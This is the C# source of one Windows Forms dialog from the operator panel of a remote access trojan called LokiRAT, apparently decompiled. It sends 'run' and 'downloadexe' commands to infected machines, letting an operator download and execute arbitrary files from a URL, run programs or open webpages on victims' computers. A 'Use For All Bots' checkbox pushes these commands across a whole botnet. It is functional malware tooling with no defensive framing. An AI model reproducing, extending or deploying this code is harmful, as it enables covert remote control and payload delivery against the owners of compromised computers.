namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class execute : Form
    {
        private Button button1;
        private Button button2;
        private Button button3;
        private CheckBox checkBox1;
        private IContainer components = null;
        private GroupBox groupBox1;
        private GroupBox groupBox2;
        private GroupBox groupBox3;
        private Label label1;
        private Label label2;
        private Label label3;
        private TextBox textBox1;
        private TextBox textBox2;
        private TextBox textBox3;

        public execute()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=run|" + this.textBox1.Text);
            base.Close();
        }

        private void button2_Click(object sender, EventArgs e)
        {
            main.sendToHost("type=command&command=run|" + this.textBox2.Text);
            base.Close();
        }

        private void button3_Click(object sender, EventArgs e)
        {
            string str = null;
            if (this.checkBox1.Checked)
            {
                str = "global";
            }
            main.sendToHost("type=" + str + "command&command=downloadexe|" + this.textBox3.Text);
            base.Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.groupBox1 = new GroupBox();
            this.button3 = new Button();
            this.label3 = new Label();
            this.textBox3 = new TextBox();
            this.groupBox2 = new GroupBox();
            this.button1 = new Button();
            this.textBox1 = new TextBox();
            this.label1 = new Label();
            this.groupBox3 = new GroupBox();
            this.button2 = new Button();
            this.label2 = new Label();
            this.textBox2 = new TextBox();
            this.checkBox1 = new CheckBox();
            this.groupBox1.SuspendLayout();
            this.groupBox2.SuspendLayout();
            this.groupBox3.SuspendLayout();
            base.SuspendLayout();
            this.groupBox1.Controls.Add(this.checkBox1);
            this.groupBox1.Controls.Add(this.button3);
            this.groupBox1.Controls.Add(this.label3);
            this.groupBox1.Controls.Add(this.textBox3);
            this.groupBox1.Location = new Point(12, 12);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new Size(0x16c, 0x71);
            this.groupBox1.TabIndex = 0;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Download And Execute";
            this.button3.Location = new Point(0xe4, 0x51);
            this.button3.Name = "button3";
            this.button3.Size = new Size(130, 0x18);
            this.button3.TabIndex = 4;
            this.button3.Text = "Download and Execute";
            this.button3.UseVisualStyleBackColor = true;
            this.button3.Click += new EventHandler(this.button3_Click);
            this.label3.AutoSize = true;
            this.label3.Location = new Point(6, 0x1d);
            this.label3.Name = "label3";
            this.label3.Size = new Size(0x33, 13);
            this.label3.TabIndex = 1;
            this.label3.Text = "File URL:";
            this.textBox3.Location = new Point(9, 0x2d);
            this.textBox3.Name = "textBox3";
            this.textBox3.Size = new Size(0x15d, 20);
            this.textBox3.TabIndex = 0;
            this.groupBox2.Controls.Add(this.button1);
            this.groupBox2.Controls.Add(this.textBox1);
            this.groupBox2.Controls.Add(this.label1);
            this.groupBox2.Location = new Point(12, 0x83);
            this.groupBox2.Name = "groupBox2";
            this.groupBox2.Size = new Size(0x16c, 0x68);
            this.groupBox2.TabIndex = 1;
            this.groupBox2.TabStop = false;
            this.groupBox2.Text = "Just Execute";
            this.button1.Location = new Point(0xe4, 0x4a);
            this.button1.Name = "button1";
            this.button1.Size = new Size(130, 0x18);
            this.button1.TabIndex = 2;
            this.button1.Text = "Execute";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            this.textBox1.Location = new Point(9, 0x2b);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x15d, 20);
            this.textBox1.TabIndex = 1;
            this.textBox1.Text = "notepad";
            this.label1.AutoSize = true;
            this.label1.Location = new Point(6, 0x1b);
            this.label1.Name = "label1";
            this.label1.Size = new Size(70, 13);
            this.label1.TabIndex = 0;
            this.label1.Text = "File Location:";
            this.groupBox3.Controls.Add(this.button2);
            this.groupBox3.Controls.Add(this.label2);
            this.groupBox3.Controls.Add(this.textBox2);
            this.groupBox3.Location = new Point(12, 0xf1);
            this.groupBox3.Name = "groupBox3";
            this.groupBox3.Size = new Size(0x16c, 100);
            this.groupBox3.TabIndex = 4;
            this.groupBox3.TabStop = false;
            this.groupBox3.Text = "Open Webpage";
            this.button2.Location = new Point(0xe4, 70);
            this.button2.Name = "button2";
            this.button2.Size = new Size(130, 0x18);
            this.button2.TabIndex = 3;
            this.button2.Text = "Open";
            this.button2.UseVisualStyleBackColor = true;
            this.button2.Click += new EventHandler(this.button2_Click);
            this.label2.AutoSize = true;
            this.label2.Location = new Point(6, 0x18);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x52, 13);
            this.label2.TabIndex = 1;
            this.label2.Text = "Webpage URL:";
            this.textBox2.Location = new Point(9, 40);
            this.textBox2.Name = "textBox2";
            this.textBox2.Size = new Size(0x15d, 20);
            this.textBox2.TabIndex = 0;
            this.textBox2.Text = "http://www.google.com/";
            this.checkBox1.AutoSize = true;
            this.checkBox1.Location = new Point(9, 0x56);
            this.checkBox1.Name = "checkBox1";
            this.checkBox1.Size = new Size(0x65, 0x11);
            this.checkBox1.TabIndex = 5;
            this.checkBox1.Text = "Use For All Bots";
            this.checkBox1.UseVisualStyleBackColor = true;
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x184, 0x15c);
            base.Controls.Add(this.groupBox3);
            base.Controls.Add(this.groupBox2);
            base.Controls.Add(this.groupBox1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "execute";
            this.Text = "Execute Application | LokiRAT";
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            this.groupBox2.ResumeLayout(false);
            this.groupBox2.PerformLayout();
            this.groupBox3.ResumeLayout(false);
            this.groupBox3.PerformLayout();
            base.ResumeLayout(false);
        }
    }
}

